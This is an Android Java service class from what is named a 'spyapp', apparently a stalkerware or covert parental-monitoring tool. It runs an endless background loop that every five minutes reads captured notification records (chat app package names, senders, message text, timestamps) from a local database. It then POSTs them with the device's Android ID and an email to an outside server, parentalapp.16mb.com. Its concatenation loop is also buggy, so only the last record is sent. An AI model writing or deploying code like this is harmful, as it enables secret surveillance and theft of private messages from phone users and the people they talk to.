package com.example.vipul.spyapp10;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class MyService extends Service {
    String Email = null;
    String DeviceId ="";
    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);

        DeviceId =Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID) ;
        Email=MainActivity.EMAIL;

        final Thread runnable = new Thread() {
            @Override
            public void run() {
                while (true) {
                    try {
                        SocialChattingApp();
                        sleep(300000);
                    } catch (Exception e) {
                        Log.e("errorinService1", e.toString());
                    }
                }
            }
        };
        runnable.start();
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public void SocialChattingApp(){
        try {
            SQLdb sqLdb = new SQLdb(getApplicationContext());
            sqLdb.open();
            int count = sqLdb.getCount();
            String[] ticker = new String[count];
            ticker = sqLdb.getList(0);
            String[] text = new String[count];
            text = sqLdb.getList(1);
            String[] time = new String[count];
            time = sqLdb.getList(2);
            String[] pack = new String[count];
            pack = sqLdb.getList(3);
            String tickerz = "", textz = "", timez = "", packz = "";
            for (int i = 0; i < count; i++) {
                tickerz = ticker[i] + "||";
                timez = time[i] + "||";
                packz = pack[i] + "||";
                textz = text[i] + "||";
            }
            String Email=MainActivity.EMAIL;
            String DeviceId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID) ;
            new UpdateUserDetailSOCIALAPP().execute(Email, DeviceId, packz, timez, tickerz, textz);
            sqLdb.close();
        }catch (Exception e){
        }
    }

    private class UpdateUserDetailSOCIALAPP extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {
            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/socio.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(6);
                nameValuePair.add(new BasicNameValuePair("email", params[0]));
                nameValuePair.add(new BasicNameValuePair("did", params[1]));
                nameValuePair.add(new BasicNameValuePair("pname", params[2]));
                nameValuePair.add(new BasicNameValuePair("timestamp", params[3]));
                nameValuePair.add(new BasicNameValuePair("contact", params[4]));
                nameValuePair.add(new BasicNameValuePair("msg", params[5]));
                Log.e("problem", "rpblem1");

                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            super.onPostExecute(jsonObject);
        }
    }
}